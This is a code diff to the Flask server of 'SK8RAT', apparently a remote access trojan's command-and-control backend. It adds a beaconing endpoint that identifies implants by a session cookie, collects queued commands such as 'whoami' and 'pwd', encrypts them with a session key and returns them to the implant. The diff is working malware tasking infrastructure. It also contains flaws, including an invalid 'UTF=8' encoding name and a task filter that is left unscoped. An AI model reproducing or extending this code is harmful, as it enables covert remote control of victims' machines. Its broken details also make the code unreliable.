@@ -385,10 +385,10 @@ class ChallengeResponseTwo(Resource):
             server_response = nonce_b64 + ":" + ciphertext_b64
             return server_response
         else:
-            return 0
+            return {'message': 'Potential MITM!'}
 
 
-# /firstcheckin
+# /stage3
 class FirstCheckIn(Resource):
     def post(self):
         # Get raw request
@@ -405,7 +405,7 @@ class FirstCheckIn(Resource):
         if (SK8RAT):
             session_key = base64.b64decode(SK8RAT.session_key)
         else:
-            return 0
+            return {'message': 'Bad cookie.'}
         
         # Decode ciphertext using pynacl, store as json object
         box = nacl.secret.SecretBox(session_key)
@@ -425,21 +425,77 @@ class FirstCheckIn(Resource):
         SK8RAT.jitter = json_blob['jitter']
         SK8RAT.last_seen = json_blob['last_seen']
         SK8RAT.save_to_db()
+
         return 1
 
 
 # /beaconing
 class Beaconing(Resource):
     def get(self):
+        
         # Read session cookie and grab corresponding session key, if cookie is invalid throw error
         session_cookie = request.cookies.get('macaroon')
         SK8RAT = SK8RATModel.query.filter(SK8RATModel.session_cookie == session_cookie).first()
         if (SK8RAT):
             session_key = base64.b64decode(SK8RAT.session_key)
         else:
-            return 0
-        
-        return "here we handle GET"
+            return {'message': 'Bad cookie.'}
+
+        # Begin to assemble server response
+        # <SK8RAT_Message Structure>
+        # guid
+        # task_id
+        # task_status
+        # task_output
+        # last_seen
+        # sleep
+        # jitter
+        data = {}
+        data['guid'] = SK8RAT.guid
+        data['last_seen'] = None
+        data['sleep'] = None
+
+        # Assemble task_id .filter(TaskModel.guid == SK8RAT.guid) #SWITCH THIS AFTER TESTING
+        #task = TaskModel.query.filter(TaskModel.task_status == "wait").all()
+        task = TaskModel.query.filter(TaskModel.task_status == "wait").all()
+        task_id_list = []
+        for x in task:
+            task_id_list.append(x.task_id)
+        data['task_id'] = task_id_list
+
+        # Assemble task
+        task_list = []
+        for x in task:
+            task_list.append(x.task)
+        data['task'] = task_list
+
+        # Assemble task_status
+        task_status_list = []
+        for x in task:
+            task_status_list.append(x.task_status)
+        data['task_status'] = task_status_list
+
+        # Assemble task_output
+        task_output_list = []
+        for x in task:
+            task_output_list.append(x.task_output)
+        data['task_output'] = task_output_list
+
+        # Server response assembled
+        json_data = json.dumps(data)
+
+        # Encrypt server response
+        message = json_data
+        box = nacl.secret.SecretBox(session_key)
+        nonce = nacl.utils.random(nacl.secret.SecretBox.NONCE_SIZE)
+        encrypted = box.encrypt(message.encode("UTF=8"), nonce)
+        ciphertext = encrypted.ciphertext
+        ciphertext_b64 = base64.b64encode(ciphertext).decode("UTF-8")
+        nonce_b64 = base64.b64encode(nonce).decode("UTF-8")
+        server_response = nonce_b64 + ":" + ciphertext_b64
+
+        return server_response
+
 
     def post(self):
         return "here we handle POST"
@@ -448,8 +504,19 @@ class Beaconing(Resource):
 # /sessiontest1
 class sessiontest1(Resource):
     def get(self):
-        SK8RAT = SK8RATModel.query.order_by(SK8RATModel.id.desc()).first()
-        return SK8RAT.id
+        data = {}
+        data['guid'] = 'this is a guid'
+        data['task_id'] = [1, 2]
+        data['task'] = ["whoami", "pwd"]
+        data['task_state'] = ["wait", "wait"]
+        data['task_output'] = [" ", " "]
+        data['last_seen'] = "this is a time"
+        data['sleep'] = 5
+        data['jitter'] = 10
+        json_data = json.dumps(data)
+        return json_data
+
+
 
 
 # /sessiontest2
